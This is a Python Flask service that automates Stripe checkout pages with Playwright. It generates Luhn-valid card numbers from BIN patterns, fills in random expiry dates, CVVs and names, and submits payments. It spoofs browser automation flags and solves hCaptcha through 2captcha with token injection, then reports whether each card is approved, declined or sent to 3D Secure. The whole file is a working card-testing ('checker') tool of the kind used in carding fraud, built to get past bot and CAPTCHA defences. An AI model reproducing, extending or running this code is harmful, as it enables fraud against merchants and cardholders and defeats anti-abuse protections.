import os
import asyncio
import json
import random
import re
import time
import base64
from datetime import datetime
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
from playwright._impl._errors import TargetClosedError
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from collections import deque
import httpx

load_dotenv()

CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "TWOCAPTCHA_API_KEY": os.getenv('TWOCAPTCHA_API_KEY'),  # Add this to your .env
    "RESPONSE_TIMEOUT_SECONDS": 50,
    "RETRY_DELAY": 2000,
    "RATE_LIMIT_REQUESTS": 5,
    "RATE_LIMIT_WINDOW": 60,
    "MAX_RETRIES": 2,
    "BROWSERLESS_TIMEOUT": 60000,
    "CAPTCHA_TIMEOUT": 120  # 2 minutes for captcha solving
}

app = Flask(__name__)
request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])

# 2Captcha solver class
class TwoCaptchaSolver:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "http://2captcha.com"
        
    async def solve_hcaptcha(self, sitekey, page_url):
        """Solve HCaptcha using 2captcha service"""
        if not self.api_key:
            print("[CAPTCHA] No 2captcha API key configured")
            return None
            
        print(f"[CAPTCHA] Submitting HCaptcha to 2captcha...")
        print(f"[CAPTCHA] Sitekey: {sitekey[:20]}...")
        print(f"[CAPTCHA] URL: {page_url[:50]}...")
        
        try:
            async with httpx.AsyncClient() as client:
                # Submit captcha
                submit_data = {
                    'key': self.api_key,
                    'method': 'hcaptcha',
                    'sitekey': sitekey,
                    'pageurl': page_url,
                    'json': 1
                }
                
                response = await client.post(f"{self.base_url}/in.php", data=submit_data)
                result = response.json()
                
                if result.get('status') != 1:
                    print(f"[CAPTCHA] Submit failed: {result.get('error_text', 'Unknown error')}")
                    return None
                
                captcha_id = result.get('request')
                print(f"[CAPTCHA] Task ID: {captcha_id}")
                
                # Poll for result
                start_time = time.time()
                while time.time() - start_time < CONFIG["CAPTCHA_TIMEOUT"]:
                    await asyncio.sleep(5)
                    
                    check_url = f"{self.base_url}/res.php?key={self.api_key}&action=get&id={captcha_id}&json=1"
                    response = await client.get(check_url)
                    result = response.json()
                    
                    if result.get('status') == 1:
                        token = result.get('request')
                        print(f"[CAPTCHA] ✓ Solved! Token: {token[:30]}...")
                        return token
                    elif result.get('request') == 'CAPCHA_NOT_READY':
                        elapsed = int(time.time() - start_time)
                        print(f"[CAPTCHA] Solving... ({elapsed}s)")
                        continue
                    else:
                        print(f"[CAPTCHA] Error: {result.get('error_text', 'Unknown')}")
                        return None
                
                print("[CAPTCHA] Timeout waiting for solution")
                return None
                
        except Exception as e:
            print(f"[CAPTCHA] Error: {e}")
            return None

# Enhanced captcha detection and handling
class CaptchaHandler:
    @staticmethod
    async def detect_hcaptcha(page):
        """Detect HCaptcha on the page"""
        try:
            # Check for HCaptcha iframe
            hcaptcha_frame = await page.query_selector('iframe[src*="hcaptcha.com"]')
            if hcaptcha_frame:
                print("[CAPTCHA] HCaptcha iframe detected")
                return True
                
            # Check for HCaptcha div
            hcaptcha_div = await page.query_selector('div[data-hcaptcha-widget-id]')
            if hcaptcha_div:
                print("[CAPTCHA] HCaptcha widget detected")
                return True
                
            # Check for h-captcha class
            hcaptcha_element = await page.query_selector('.h-captcha')
            if hcaptcha_element:
                print("[CAPTCHA] HCaptcha element detected")
                return True
                
            return False
            
        except Exception as e:
            print(f"[CAPTCHA] Detection error: {e}")
            return False
    
    @staticmethod
    async def get_hcaptcha_sitekey(page):
        """Extract HCaptcha sitekey from the page"""
        try:
            # Method 1: From data-sitekey attribute
            element = await page.query_selector('[data-sitekey]')
            if element:
                sitekey = await element.get_attribute('data-sitekey')
                if sitekey:
                    return sitekey
            
            # Method 2: From iframe src
            iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
            if iframe:
                src = await iframe.get_attribute('src')
                match = re.search(r'sitekey=([a-zA-Z0-9-]+)', src)
                if match:
                    return match.group(1)
            
            # Method 3: From script content
            scripts = await page.query_selector_all('script')
            for script in scripts:
                content = await script.inner_text()
                match = re.search(r'["\']sitekey["\']\s*:\s*["\']([a-zA-Z0-9-]+)["\']', content)
                if match:
                    return match.group(1)
                    
            print("[CAPTCHA] Could not find sitekey")
            return None
            
        except Exception as e:
            print(f"[CAPTCHA] Sitekey extraction error: {e}")
            return None
    
    @staticmethod
    async def inject_captcha_token(page, token):
        """Inject the solved captcha token into the page"""
        try:
            # Method 1: Set h-captcha-response
            await page.evaluate(f'''
                () => {{
                    const responseField = document.querySelector('[name="h-captcha-response"]');
                    if (responseField) {{
                        responseField.value = '{token}';
                        responseField.innerHTML = '{token}';
                    }}
                    
                    const gResponseField = document.querySelector('[name="g-recaptcha-response"]');
                    if (gResponseField) {{
                        gResponseField.value = '{token}';
                        gResponseField.innerHTML = '{token}';
                    }}
                    
                    // Try to trigger callback
                    if (typeof hcaptcha !== 'undefined' && hcaptcha.execute) {{
                        window.hcaptcha.execute();
                    }}
                    
                    // Trigger any callback functions
                    if (window.hcaptchaCallback) {{
                        window.hcaptchaCallback('{token}');
                    }}
                    
                    if (window.onHcaptchaCallback) {{
                        window.onHcaptchaCallback('{token}');
                    }}
                }}
            ''')
            
            # Method 2: Dispatch event
            await page.evaluate(f'''
                () => {{
                    const event = new CustomEvent('hcaptcha-verified', {{
                        detail: {{ response: '{token}' }}
                    }});
                    document.dispatchEvent(event);
                }}
            ''')
            
            print("[CAPTCHA] ✓ Token injected")
            return True
            
        except Exception as e:
            print(f"[CAPTCHA] Injection error: {e}")
            return False

def rate_limit_check():
    now = time.time()
    while request_timestamps and request_timestamps[0] < now - CONFIG["RATE_LIMIT_WINDOW"]:
        request_timestamps.popleft()
    
    if len(request_timestamps) >= CONFIG["RATE_LIMIT_REQUESTS"]:
        oldest = request_timestamps[0]
        wait_time = CONFIG["RATE_LIMIT_WINDOW"] - (now - oldest)
        return False, wait_time
    
    request_timestamps.append(now)
    return True, 0

# Card utilities (keeping existing functions)
def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate):
            return candidate
    return None

def get_card_length(bin_str):
    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
    return 15 if first_two in ['34', '37'] else 16

def get_cvv_length(card_number):
    return 4 if len(card_number) == 15 else 3

def random_digit():
    return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
    card_length = get_card_length(clean_pattern.replace('x', '0'))
    
    result = ''
    for char in clean_pattern:
        if len(result) >= card_length - 1:
            break
        result += random_digit() if char.lower() == 'x' else char
    
    while len(result) < card_length - 1:
        result += random_digit()
    
    result = result[:card_length - 1]
    return complete_luhn(result) or result + '0'

def process_card_with_placeholders(number, month, year, cvv):
    processed_number = generate_card_from_pattern(number) if 'x' in number.lower() else number
    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
    
    current_year = datetime.now().year
    if 'x' in year.lower():
        processed_year = str(random.randint(current_year + 1, current_year + 6))
    elif len(year) == 2:
        processed_year = '20' + year
    else:
        processed_year = year
    
    cvv_length = get_cvv_length(processed_number)
    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
    
    return {
        "number": processed_number,
        "month": processed_month,
        "year": processed_year,
        "cvv": processed_cvv
    }

def process_card_input(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        return None
    return process_card_with_placeholders(*parts)

def generate_random_name():
    first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Avery', 'Quinn', 'Sage', 'Parker']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Enhanced Response Analyzer (keeping existing)
class StripeResponseAnalyzer:
    @staticmethod
    def is_stripe_endpoint(url):
        return any(domain in url.lower() for domain in ['stripe.com', 'stripe.network'])
    
    @staticmethod
    def is_payment_critical_endpoint(url):
        critical = [
            '/v1/payment_intents',
            '/v1/payment_pages',
            '/v1/tokens',
            '/v1/payment_methods',
            '/confirm',
            '/v1/charges'
        ]
        return any(endpoint in url.lower() for endpoint in critical)
    
    @staticmethod
    def analyze_response(url, status, body_text, result_dict):
        try:
            data = json.loads(body_text)
        except:
            return
        
        result_dict["raw_responses"].append({
            "url": url,
            "status": status,
            "data": data,
            "timestamp": datetime.now().isoformat()
        })
        
        if StripeResponseAnalyzer.is_payment_critical_endpoint(url):
            print(f"[PAYMENT API] {url[:60]}... [{status}]")
            print(f"[DATA] {json.dumps(data)[:300]}...")
        
        if data.get('success_url'):
            result_dict["success_url"] = data['success_url']
            print(f"[SUCCESS URL] {data['success_url']}")
        
        is_payment_success = (
            data.get('status') in ['succeeded', 'success', 'requires_capture', 'processing', 'complete'] or
            data.get('payment_intent', {}).get('status') in ['succeeded', 'success', 'requires_capture', 'processing'] or
            data.get('payment_status') in ['paid', 'complete'] or
            data.get('outcome', {}).get('type') == 'authorized' or
            data.get('status') == 'complete' and 'payment_intent' in data or
            data.get('paid') == True or
            (data.get('object') == 'setup_intent' and data.get('status') == 'succeeded')
        )
        
        if is_payment_success:
            result_dict["payment_confirmed"] = True
            result_dict["success"] = True
            result_dict["message"] = f"Payment {data.get('status', 'succeeded')}"
            result_dict["payment_intent_id"] = (
                data.get('id') or 
                data.get('payment_intent', {}).get('id') or
                data.get('payment_intent')
            )
            print(f"[✓✓✓ PAYMENT CONFIRMED] {data.get('status')}")
            return
        
        if status == 200 and data.get('id', '').startswith('tok_'):
            result_dict["token_created"] = True
            result_dict["token_id"] = data.get('id')
            print(f"[TOKEN] {data.get('id')}")
        
        if status == 200 and data.get('id', '').startswith('pm_'):
            result_dict["payment_method_created"] = True
            result_dict["payment_method_id"] = data.get('id')
            print(f"[PAYMENT METHOD] {data.get('id')}")
        
        if status == 200 and data.get('id', '').startswith('pi_'):
            result_dict["payment_intent_created"] = True
            result_dict["payment_intent_id"] = data.get('id')
            result_dict["client_secret"] = data.get('client_secret')
            print(f"[PAYMENT INTENT] {data.get('id')} - Status: {data.get('status')}")
        
        error = data.get('error') or data.get('payment_intent', {}).get('last_payment_error')
        if error:
            decline_code = error.get('decline_code') or error.get('code') or "unknown"
            error_message = error.get('message') or "Transaction error"
            result_dict["error"] = error_message
            result_dict["decline_code"] = decline_code
            result_dict["success"] = False
            print(f"[ERROR] {decline_code}: {error_message}")
        
        if data.get('status') == 'requires_action' or data.get('next_action'):
            result_dict["requires_3ds"] = True
            print("[3DS] Required")

async def safe_wait(page, ms):
    try:
        await page.wait_for_timeout(ms)
        return True
    except:
        return False

async def run_stripe_automation(url, cc_string, email=None):
    card = process_card_input(cc_string)
    if not card:
        return {"error": "Invalid card format"}
    
    email = email or f"test{random.randint(1000,9999)}@example.com"
    random_name = generate_random_name()
    
    print(f"\n{'='*80}")
    print(f"[START] {datetime.now().strftime('%H:%M:%S')}")
    print(f"[CARD] {card['number']} | {card['month']}/{card['year']} | {card['cvv']}")
    print(f"[EMAIL] {email}")
    print('='*80)
    
    stripe_result = {
        "status": "pending",
        "raw_responses": [],
        "payment_confirmed": False,
        "token_created": False,
        "payment_method_created": False,
        "payment_intent_created": False,
        "success_url": None,
        "requires_3ds": False,
        "captcha_solved": False
    }
    
    analyzer = StripeResponseAnalyzer()
    captcha_handler = CaptchaHandler()
    captcha_solver = TwoCaptchaSolver(CONFIG.get("TWOCAPTCHA_API_KEY"))
    
    async with async_playwright() as p:
        browser = None
        context = None
        page = None
        payment_submitted = False
        
        try:
            # Connect to browser
            if CONFIG["RUN_LOCAL"]:
                browser = await p.chromium.launch(headless=False, slow_mo=100)
                print("[BROWSER] Local")
            else:
                print("[BROWSER] Connecting to Browserless...")
                browser_url = f"wss://production-sfo.browserless.io/chromium/playwright?token={CONFIG['BROWSERLESS_API_KEY']}&timeout={CONFIG['BROWSERLESS_TIMEOUT']}"
                try:
                    browser = await p.chromium.connect(browser_url, timeout=30000)
                    print("[BROWSER] ✓ Connected")
                except Exception as e:
                    print(f"[BROWSER] Failed: {e}")
                    browser = await p.chromium.launch(headless=True)
            
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                locale='en-US',
                timezone_id='America/New_York'
            )
            
            # Add stealth scripts
            await context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false,
                });
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5],
                });
            """)
            
            page = await context.new_page()
            
            # Response capture
            async def capture_response(response):
                try:
                    if not analyzer.is_stripe_endpoint(response.url):
                        return
                    
                    content_type = response.headers.get('content-type', '')
                    if 'application/json' in content_type:
                        try:
                            body = await response.body()
                            text = body.decode('utf-8', errors='ignore')
                            analyzer.analyze_response(response.url, response.status, text, stripe_result)
                        except:
                            pass
                except:
                    pass
            
            page.on("response", capture_response)
            
            # Navigate
            print("[NAV] Loading...")
            await page.goto(url, wait_until="domcontentloaded", timeout=40000)
            print("[NAV] ✓ Loaded")
            
            await safe_wait(page, 3000)
            
            # Check for HCaptcha BEFORE filling anything
            has_captcha = await captcha_handler.detect_hcaptcha(page)
            if has_captcha:
                print("[CAPTCHA] HCaptcha detected on page")
                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                
                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                    print(f"[CAPTCHA] Sitekey found: {sitekey}")
                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                    
                    if token:
                        await captcha_handler.inject_captcha_token(page, token)
                        stripe_result["captcha_solved"] = True
                        await safe_wait(page, 2000)
                        print("[CAPTCHA] ✓ Solved and injected")
                    else:
                        print("[CAPTCHA] Failed to solve")
                else:
                    print("[CAPTCHA] Cannot solve - missing sitekey or API key")
            
            # Fill email
            print("[FILL] Email...")
            email_filled = False
            for selector in [
                'input[type="email"]',
                'input[name="email"]',
                '#email',
                'input[placeholder*="email" i]',
                'input[id*="email" i]'
            ]:
                try:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        if await element.is_visible():
                            await element.click()
                            await element.fill("")  # Clear first
                            await element.type(email, delay=50)
                            email_filled = True
                            print(f"[EMAIL] ✓ {email}")
                            break
                    if email_filled:
                        break
                except:
                    continue
            
            await safe_wait(page, 1500)
            
            # Enhanced card filling with better frame detection
            print("[FILL] Card details...")
            filled_status = {"card": False, "expiry": False, "cvc": False, "name": False}
            
            # Try to fill name if field exists
            try:
                name_selectors = [
                    'input[name*="name" i]:not([name*="email"])',
                    'input[placeholder*="name" i]:not([placeholder*="email"])',
                    '#cardholder-name'
                ]
                for selector in name_selectors:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        if await element.is_visible():
                            await element.click()
                            await element.fill(random_name)
                            filled_status["name"] = True
                            print(f"[NAME] ✓ {random_name}")
                            break
                    if filled_status["name"]:
                        break
            except:
                pass
            
            # Get all frames including nested ones
            frames = page.frames
            stripe_frames = [f for f in frames if 'stripe' in f.url.lower()]
            print(f"[FRAMES] {len(stripe_frames)} Stripe frames found")
            
            # Try multiple times to fill card details
            for attempt in range(3):
                if all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
                    break
                    
                print(f"[FILL] Attempt {attempt + 1}")
                
                for frame in stripe_frames:
                    try:
                        # Wait for frame to be ready
                        await frame.wait_for_load_state('domcontentloaded', timeout=5000)
                        
                        # Card number
                        if not filled_status["card"]:
                            card_selectors = [
                                'input[placeholder*="1234" i]',
                                'input[placeholder*="card number" i]',
                                'input[name="cardnumber"]',
                                'input[autocomplete="cc-number"]',
                                'input[aria-label*="card" i]'
                            ]
                            for selector in card_selectors:
                                try:
                                    element = await frame.query_selector(selector)
                                    if element and await element.is_visible():
                                        await element.click()
                                        await element.fill("")  # Clear first
                                        for digit in card['number']:
                                            await element.type(digit, delay=random.randint(30, 80))
                                        filled_status["card"] = True
                                        print(f"[CARD] ✓ {card['number']}")
                                        break
                                except:
                                    continue
                        
                        # Expiry
                        if not filled_status["expiry"]:
                            expiry_selectors = [
                                'input[placeholder*="mm" i]',
                                'input[placeholder*="expir" i]',
                                'input[name="exp-date"]',
                                'input[autocomplete="cc-exp"]'
                            ]
                            for selector in expiry_selectors:
                                try:
                                    element = await frame.query_selector(selector)
                                    if element and await element.is_visible():
                                        await element.click()
                                        await element.fill("")
                                        exp_string = f"{card['month']}{card['year'][-2:]}"
                                        for char in exp_string:
                                            await element.type(char, delay=random.randint(30, 80))
                                        filled_status["expiry"] = True
                                        print(f"[EXPIRY] ✓ {card['month']}/{card['year'][-2:]}")
                                        break
                                except:
                                    continue
                        
                        # CVC
                        if not filled_status["cvc"]:
                            cvc_selectors = [
                                'input[placeholder*="cvc" i]',
                                'input[placeholder*="cvv" i]',
                                'input[placeholder*="security" i]',
                                'input[name="cvc"]',
                                'input[autocomplete="cc-csc"]'
                            ]
                            for selector in cvc_selectors:
                                try:
                                    element = await frame.query_selector(selector)
                                    if element and await element.is_visible():
                                        await element.click()
                                        await element.fill("")
                                        for digit in card['cvv']:
                                            await element.type(digit, delay=random.randint(30, 80))
                                        filled_status["cvc"] = True
                                        print(f"[CVC] ✓ {card['cvv']}")
                                        break
                                except:
                                    continue
                    except Exception as e:
                        print(f"[FRAME] Error in frame {frame.url[:50]}: {e}")
                        continue
                
                if not all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
                    await safe_wait(page, 1000)
            
            print(f"[STATUS] {filled_status}")
            
            # Wait for validation
            await safe_wait(page, 3000)
            
            # Check for captcha again before submit
            has_captcha_after = await captcha_handler.detect_hcaptcha(page)
            if has_captcha_after and not stripe_result["captcha_solved"]:
                print("[CAPTCHA] HCaptcha appeared after filling")
                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
                
                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
                    if token:
                        await captcha_handler.inject_captcha_token(page, token)
                        stripe_result["captcha_solved"] = True
                        await safe_wait(page, 2000)
            
            # Submit payment
            print("[SUBMIT] Looking for submit button...")
            submit_selectors = [
                'button[type="submit"]:visible',
                'button.SubmitButton:visible',
                'button:has-text("pay"):visible',
                'button:has-text("submit"):visible',
                'button:has-text("complete"):visible',
                'button.btn-primary:visible'
            ]
            
            for selector in submit_selectors:
                try:
                    btn = page.locator(selector).first
                    if await btn.count() > 0:
                        # Check if button is enabled
                        is_disabled = await btn.get_attribute('disabled')
                        if is_disabled is None or is_disabled == 'false':
                            await btn.click()
                            payment_submitted = True
                            print(f"[SUBMIT] ✓ Clicked: {selector}")
                            break
                except:
                    continue
            
            if not payment_submitted:
                # Try pressing Enter as fallback
                await page.keyboard.press('Enter')
                payment_submitted = True
                print("[SUBMIT] ✓ Enter key pressed")
            
            # Wait for payment processing
            print("[WAIT] Processing payment (15s)...")
            await safe_wait(page, 15000)
            
            # Monitor for response
            print("[MONITORING] Waiting for confirmation...")
            start_time = time.time()
            max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
            last_response_count = 0
            
            while time.time() - start_time < max_wait:
                elapsed = time.time() - start_time
                
                current_responses = len(stripe_result['raw_responses'])
                if current_responses > last_response_count:
                    print(f"[MONITOR] {current_responses} responses captured")
                    last_response_count = current_responses
                
                if stripe_result.get("payment_confirmed"):
                    print("[✓✓✓ SUCCESS] Payment confirmed!")
                    break
                
                if stripe_result.get("error"):
                    print(f"[ERROR] {stripe_result['error']}")
                    break
                
                if stripe_result.get("requires_3ds"):
                    print("[3DS] Authentication required")
                    break
                
                # Check URL for success
                try:
                    current_url = page.url
                    success_url = stripe_result.get("success_url")
                    
                    if success_url and current_url.startswith(success_url):
                        print(f"[✓ SUCCESS] Redirected to: {current_url[:80]}")
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        break
                    
                    if any(x in current_url.lower() for x in ['success', 'thank-you', 'complete', 'confirmed']):
                        print(f"[SUCCESS PAGE] {current_url[:80]}")
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        break
                except:
                    pass
                
                # Keep page alive
                if int(elapsed) % 5 == 0 and int(elapsed) > 0:
                    try:
                        await page.evaluate('1')
                    except:
                        print("[WARNING] Browser disconnected")
                        break
                
                await asyncio.sleep(0.5)
            
            print(f"\n[SUMMARY] {len(stripe_result['raw_responses'])} Stripe API responses captured")
            
            # Build final response
            if stripe_result.get("payment_confirmed"):
                return {
                    "success": True,
                    "message": stripe_result.get("message", "Payment successful"),
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "payment_intent_id": stripe_result.get("payment_intent_id"),
                    "token_id": stripe_result.get("token_id"),
                    "payment_method_id": stripe_result.get("payment_method_id"),
                    "captcha_solved": stripe_result.get("captcha_solved"),
                    "raw_responses": stripe_result["raw_responses"]
                }
            elif stripe_result.get("requires_3ds"):
                return {
                    "success": False,
                    "requires_3ds": True,
                    "message": "3D Secure required",
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "captcha_solved": stripe_result.get("captcha_solved"),
                    "raw_responses": stripe_result["raw_responses"]
                }
            elif stripe_result.get("error"):
                return {
                    "success": False,
                    "error": stripe_result["error"],
                    "decline_code": stripe_result.get("decline_code"),
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "captcha_solved": stripe_result.get("captcha_solved"),
                    "raw_responses": stripe_result["raw_responses"]
                }
            else:
                return {
                    "success": False,
                    "message": "Payment not confirmed - check raw responses",
                    "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                    "details": {
                        "filled": filled_status,
                        "payment_submitted": payment_submitted,
                        "captcha_solved": stripe_result.get("captcha_solved"),
                        "responses": len(stripe_result["raw_responses"])
                    },
                    "raw_responses": stripe_result["raw_responses"]
                }
                
        except Exception as e:
            print(f"[ERROR] {str(e)}")
            return {
                "error": f"Automation failed: {str(e)}",
                "captcha_solved": stripe_result.get("captcha_solved", False),
                "raw_responses": stripe_result.get("raw_responses", [])
            }
            
        finally:
            if page:
                try:
                    await page.close()
                except:
                    pass
            if context:
                try:
                    await context.close()
                except:
                    pass
            if browser:
                try:
                    await browser.close()
                except:
                    pass
            print("[CLEANUP] ✓")

@app.route('/hrkXstripe', methods=['GET'])
def stripe_endpoint():
    can_proceed, wait_time = rate_limit_check()
    if not can_proceed:
        return jsonify({"error": "Rate limit exceeded", "retry_after": f"{wait_time:.1f}s"}), 429
    
    url = request.args.get('url')
    cc = request.args.get('cc')
    email = request.args.get('email')
    
    print(f"\n{'='*80}")
    print(f"[REQUEST] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[URL] {url[:100]}...")
    print(f"[CC] {cc}")
    print('='*80)
    
    if not url or not cc:
        return jsonify({"error": "Missing parameters: url and cc"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(run_stripe_automation(url, cc, email))
        print(f"[RESULT] {'✓ SUCCESS' if result.get('success') else '✗ FAILED'}")
        return jsonify(result), 200 if result.get('success') else 400
    except Exception as e:
        print(f"[SERVER ERROR] {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        loop.close()

@app.route('/status', methods=['GET'])
def status_endpoint():
    return jsonify({
        "status": "online",
        "version": "3.0-captcha-support",
        "features": {
            "hcaptcha": True,
            "2captcha": bool(CONFIG.get("TWOCAPTCHA_API_KEY")),
            "auto_retry": True
        },
        "timestamp": datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print("="*80)
    print("[SERVER] Stripe Automation v3.0 - HCaptcha Support")
    print(f"[PORT] {port}")
    print(f"[2CAPTCHA] {'Enabled' if CONFIG.get('TWOCAPTCHA_API_KEY') else 'Disabled'}")
    print("="*80)
    app.run(host='0.0.0.0', port=port, debug=False)
